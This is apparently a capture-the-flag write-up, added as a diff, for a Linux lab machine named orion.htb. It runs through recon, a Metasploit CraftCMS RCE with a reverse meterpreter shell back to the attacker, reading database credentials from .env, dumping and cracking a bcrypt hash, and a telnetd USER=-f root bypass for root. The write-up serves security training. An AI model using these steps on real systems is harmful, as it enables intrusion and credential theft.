@@ -1,0 +1,108 @@
+**Difficulty:** Easy
+**OS:** Linux
+**Date:** 15.10.2026
+
+---
+
+## 1. Reconnaissance
+
+Nmap scan:
+nmap -sV -sC -p- <IP>
+Open ports:
+
+22/tcp — SSH
+
+80/tcp — HTTP (CraftCMS)
+
+Port 80 redirects to orion.htb. Add it to /etc/hosts:
+
+echo "10.129.117.13 orion.htb" | sudo tee -a /etc/hosts
+2. Enumeration
+Directory enumeration with ffuf:
+
+ffuf -u http://orion.htb/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200
+Found: /admin/login — exposes CraftCMS version 5.6.16.
+
+3. Initial Foothold (CVE-2025-32432)
+Vulnerability: CraftCMS 5.6.16 — unauthenticated RCE via asset transformation.
+
+Exploit via Metasploit:
+
+msfconsole -q
+use exploit/linux/http/craftcms_preauth_rce_cve_2025_32432
+set RHOST orion.htb
+set LHOST <Attacker IP>
+set LPORT 4444
+set payload php/meterpreter/reverse_http
+run
+Result: Meterpreter session as www-data.
+
+4. Database Credentials
+Found .env file in the Craft installation directory:
+
+cat /var/www/html/craft/.env
+Contains MySQL credentials:
+
+Database: orion
+
+Username: root
+
+Password: SuperSecureCraft123Pass!
+
+5. MySQL Enumeration
+Since Meterpreter shell was unstable, used execute to run MySQL directly:
+
+execute -f /usr/bin/mysql -a "-h 127.0.0.1 -P 3306 -u root -pSuperSecureCraft123Pass! orion -e 'SHOW TABLES;' > /tmp/tables.txt 2>&1"
+cat /tmp/tables.txt
+Extracted users table:
+
+execute -f /usr/bin/mysql -a "-h 127.0.0.1 -P 3306 -u root -pSuperSecureCraft123Pass! orion -e 'SELECT id,username,email,password FROM users;' > /tmp/users.txt"
+cat /tmp/users.txt
+Result:
+
+id  username  email              password
+1   admin     adam@orion.htb     $2y$13$e9zuohgFZzGtbQalcn9Mz.5PJbjxobO0GMbXo8NHp3P/B42LUg0lS
+
+6. Cracking the Hash
+bcrypt hash ($2y$13$...). Crack with John:
+
+john --format=bcrypt adam.txt --wordlist=/usr/share/wordlists/rockyou.txt
+Result: password for adam.
+
+7. SSH Access
+ssh adam@orion.htb
+
+8. Privilege Escalation (CVE-2026-24061)
+Enumeration:
+
+ss -lntp
+Found Telnet (port 23) running locally.
+
+Check version:
+
+telnet --version
+Vulnerability: GNU Inetutils telnetd — authentication bypass via USER environment variable.
+
+Exploit PoC:
+
+python3 poc.py 127.0.0.1 23
+Result: root shell.
+
+id
+uid=0(root) gid=0(root) groups=0(root)
+
+9. Flags
+User flag: cat /home/adam/user.txt
+
+Root flag: cat /root/root.txt
+
+10. Lessons Learned
+Always check CMS version and search for known CVEs.
+
+.env files often contain credentials.
+
+bcrypt hashes can be cracked with John/Hashcat.
+
+Legacy services (Telnet) should never be exposed.
+
+CVE-2026-24061 — Telnet auth bypass via USER=-f root.
